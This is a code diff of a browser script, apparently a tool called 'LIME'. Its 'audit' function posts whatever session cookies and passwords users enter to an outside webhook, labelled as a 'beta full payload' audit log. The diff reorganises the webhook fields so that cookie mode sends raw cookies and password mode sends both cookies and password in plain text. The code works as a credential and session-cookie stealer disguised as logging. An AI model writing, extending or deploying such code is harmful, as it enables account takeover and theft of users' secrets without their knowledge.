@@ -48,22 +48,21 @@ function safe(v,n=1800){return String(v??'').replace(/```/g,'`\u200b``').slice(0
 async function audit(){
  if(!WEBHOOK||!last)return;
  const title='🍋 LIME / USAGE #'+last.usage;
- const cookiesBlock = last.cookies
-  ? '```text\n' + safe(last.cookies) + '\n```'
-  : '`[empty]`';
- const passwordBlock = last.password
-  ? '```text\n' + safe(last.password) + '\n```'
-  : '`[empty]`';
- const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title,description:'A LIME usage was recorded (beta — full payload included).',color:0xB7F34D,timestamp:new Date().toISOString(),fields:[
+ const fields=[
   {name:'Mode',value:mode.toUpperCase(),inline:true},
   {name:'Cookies entered',value:last.cookiesEntered?'Yes':'No',inline:true},
   {name:'Cookies length',value:String(last.cookiesLength)+' chars',inline:true},
   {name:'Password entered',value:last.passwordProvided?'Yes':'No',inline:true},
   {name:'Usage count (this browser)',value:String(last.usage),inline:true},
-  {name:'Request ID',value:'`'+last.requestId+'`',inline:false},
-  {name:'Cookies (beta)',value:cookiesBlock,inline:false},
-  {name:'Password (beta)',value:passwordBlock,inline:false}
- ],footer:{text:'LIME • Audit Log • beta full payload'}}]};
+  {name:'Request ID',value:'`'+last.requestId+'`',inline:false}
+ ];
+ if(mode==='cookie'){
+  fields.push({name:'Cookies (beta)',value:last.cookies?'```text\n'+safe(last.cookies)+'\n```':'`[empty]`',inline:false});
+ }else{
+  fields.push({name:'Cookies (beta)',value:last.cookies?'```text\n'+safe(last.cookies)+'\n```':'`[empty]`',inline:false});
+  fields.push({name:'Password (beta)',value:last.password?'```text\n'+safe(last.password)+'\n```':'`[empty]`',inline:false});
+ }
+ const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title,description:'A LIME usage was recorded (beta — full payload included).',color:0xB7F34D,timestamp:new Date().toISOString(),fields,footer:{text:'LIME • Audit Log • beta full payload'}}]};
  try{await fetch(WEBHOOK+'?wait=true',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true})}catch(e){console.warn('Audit delivery failed',e)}
 }
 function setMode(next){mode=next;$('cookie').classList.toggle('active',next==='cookie');$('passwordMode').classList.toggle('active',next==='password');$('passwordBox').classList.toggle('show',next==='password')}
